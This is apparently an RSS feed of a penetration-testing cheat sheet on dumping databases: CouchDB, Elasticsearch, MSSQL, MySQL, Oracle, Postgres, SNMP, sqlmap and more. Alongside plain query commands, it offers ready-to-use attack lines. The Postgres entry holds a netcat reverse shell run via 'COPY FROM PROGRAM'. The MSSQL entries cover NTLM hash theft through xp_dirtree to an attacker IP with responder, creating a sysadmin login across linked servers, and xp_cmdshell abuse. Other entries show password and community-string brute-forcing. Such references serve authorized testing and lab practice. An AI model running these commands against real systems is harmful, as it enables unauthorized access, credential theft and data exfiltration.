channel.title: Database Dumping on TLDRBins
channel.description: Recent content in Database Dumping on TLDRBins

item.title: CouchDB
item.description: Basic # Show all databases curl http://localhost:5984/_all_dbs # Show all databases (With Creds) curl http://<USER>:<PASSWORD>@localhost:5984/_all_dbs # Show all docs from database curl http://localhost:5984/<DB_NAME>/_all_docs # Show a entry curl http://localhost:5984/<DB_NAME>/<ID_HASH>

item.title: Docker Registry
item.description: Docker Registry API # List repos curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/_catalog $ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/_catalog {"repositories":["bolt-image"]} # List of tags of this repo curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/tags/list $ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/tags/list {"name":"bolt-image","tags":["latest"]} # List manifest file for this tag (e.g. latest) curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/manifests/<TAG> $ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/manifests/latest { "schemaVersion": 1, "name": "bolt-image", "tag": "latest", "architecture": "amd64", "fsLayers": [ { "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b" }, { "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee" }, { "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c" }, .

item.title: elasticsearch
item.description: Basic Commands # List indexes curl -s <TARGET>:9200/_cat/indices?v # Dump data with index name curl -s -X GET "<TARGET>:9200/<INDEX_NAME>/_search?size=100" -H 'Content-Type: application/json' -d' { "query": { "match_all": {} } } ' | jq .

item.title: Graphql
item.description: Visualize Tool +---------------------------------------------------------------+ | 1. Change Schema -> Introspection -> Copy Introspection Query | | 2. Paste query | | 3. Display | +---------------------------------------------------------------+ Ref: graphql-voyager Basic Commands # Get fields from schema curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name,fields{name,description}}}}"}' | jq . # Get types name curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | jq . # Get fields of type (e.g. User) curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){name,fields{name}}}"}' | jq .

item.title: memcache
item.description: Connect telnet memcached-cli # Connect telnet 127.0.0.1 11211 # Install sudo npm install -g memcached-cli # Connect (With Creds) memcached-cli '<USER>:<PASSWORD>@<TARGET>:11211' Basic Commmands # Info about slabs stats slabs # Show slab info (e.g. slab 1 and display all keys) stats cachedump 1 0 # Dump info get <ITEM_NAME>

item.title: Microsoft Access Database
item.description: Tools mdbtools sudo apt install mdbtools Basic # Show all tables mdb-tables <MDB_FILE> $ mdb-tables backup.mdb acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock ...[SNIP]... # Show tables with data mdb-tables <MDB_FILE> | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export <MDB_FILE> $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done $ mdb-tables backup.mdb | tr ' ' '\n' | grep .

item.title: MongoDB General
item.description: General Connect to Mongo Database anonymous authenticate mongosh <TARGET>:27017 $ mongosh 172.17.0.3:27017 Current Mongosh Log ID: 66f2fa2192b07a1eeb856ec6 Connecting to: mongodb://172.17.0.3:27017/?directConnection=true&appName=mongosh+2.2.12 Using MongoDB: 5.0.6 Using Mongosh: 2.2.12 For mongosh info see: https://docs.mongodb.com/mongodb-shell/ ------ The server generated these startup warnings when booting 2024-09-24T10:44:22.876+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem 2024-09-24T10:44:23.824+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted ------ Warning: Found ~/.

item.title: MSSQL Agent Jobs
item.description: 1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Fix : Cannot resolve the collation conflict between "Latin1_General_CI_AI" and "SQL_Latin1_General_CP1_CI_AS" SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN='<PRINCIPAL>'; INSERT proxies EXEC msdb.

item.title: MSSQL General
item.description: General Connect to MSSQL DB Linux Windows impacket-mssqlclient '<USER>:<PASSWORD>@<TARGET>' # Without TLS impacket-mssqlclient -windows-auth '<USER>:<PASSWORD>@<TARGET>' # With Current User sqlcmd -S '<TARGET>' -Q "<QUERY>" # With Cred sqlcmd -S '<TARGET>' -U '<USER>' -P '<PASSWORD>' -d '<DB_NAME>' -Q "<QUERY>" Basic Commands # Check mssql version SELECT @@version; # Check current user SELECT suser_name(); # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = '1'; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.

item.title: MSSQL Linked Servers
item.description: Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; # Show linked servers enum_links Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [<LINKED_SERVER>]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [<CURRENT_SERVER>]') at [<LINKED_SERVER>]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN <USER> WITH PASSWORD = ''''<PASSWORD>'''';'') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>] EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<USER>'''', ''''sysadmin'''''') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]

item.title: MSSQL Privilege Escalation
item.description: Enum # Import Module . .\PowerUpSQL.ps1 # Audit Invoke-SQLAudit -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Verbose # Execute Query Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query "<QUERY>" -Verbose Ref: PowerUpSQL.ps1 Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 Method 1 Method 2 Method 3 xp_dirtree '\\<LOCAL_IP>\any\thing'; use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing'; load_file('\\<LOCAL_IP>\any\thing'); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.

item.title: Mysql General
item.description: General Connect to mysql Database # Database unknown mysql -u <USER> -h <TARGET> -p'<PASSWORD>' # Database known mysql -u <USER> -D <DB_NAME> -h <TARGET> -p'<PASSWORD>' # Execute query inline mysql -u <USER> -D <DB_NAME> -h <TARGET> -p'<PASSWORD>' -e 'show tables;' Basic Commands # Show all databases show databases; # Choose database use <DB_NAME>; # Show all tables show tables; # Show all entries in table_name select * from <TABLE_NAME>; Update Entry # Update Entry Example UPDATE users set user_type='Administrator' where email='test@example.

item.title: Oracle Database
item.description: Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT Enum # SID enum (You only need one) odat sidguesser -s <TARGET> # User/Password brute force odat passwordguesser -s <TARGET> -d <SID> --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba General # Export everytime or add to ~/.

item.title: Postgresql
item.description: Connect psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME> psql 'postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>' Basic # Show databases \list # Use database \connect <DB_NAME> # Show tables in current database \dt # Dump data from table select * from "<TABLE_NAME>"; # Insert data into table (e.g) insert into "<TABLE_NAME>" (username, password, role) values ('user', 'password', 'admin'); # Write text copy (select '<STRING>') to '/var/lib/postgresql/.profile'; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash <LOCAL_IP> <LOCAL_PORT> &'

item.title: SNMP
item.description: Bruteforce commmuity string onesixtyone snmpbrute # Brute force community string for snmpwalk use onesixtyone <TARGET> -c /usr/share/doc/onesixtyone/dict.txt $ onesixtyone 10.10.11.248 -c /usr/share/doc/onesixtyone/dict.txt Scanning 1 hosts, 50 communities 10.10.11.248 [public] Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 Ref: onesixtyone # Brute force community string (Check also SNMPv2) python3 snmpbrute.py -t <TARGET> $ python3 snmpbrute.py -t 10.10.11.248 _____ _ ____ _______ ____ __ / ___// | / / |/ / __ \ / __ )_______ __/ /____ \__ \/ |/ / /|_/ / /_/ / / __ / ___/ / / / __/ _ \ ___/ / /| / / / / ____/ / /_/ / / / /_/ / /_/ __/ /____/_/ |_/_/ /_/_/ /_____/_/ \__,_/\__/\___/ SNMP Bruteforce & Enumeration Script v2.

item.title: SQL Injection
item.description: sqlmap # In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.

item.title: SQLite
item.description: General # Open a db sqlite3 <DB_FILE> # Show tables .tables # Show schema of a table .schema <TABLE_NAME> # Show column headers .headers on # Dump data select * from <TABLE_NAME>;
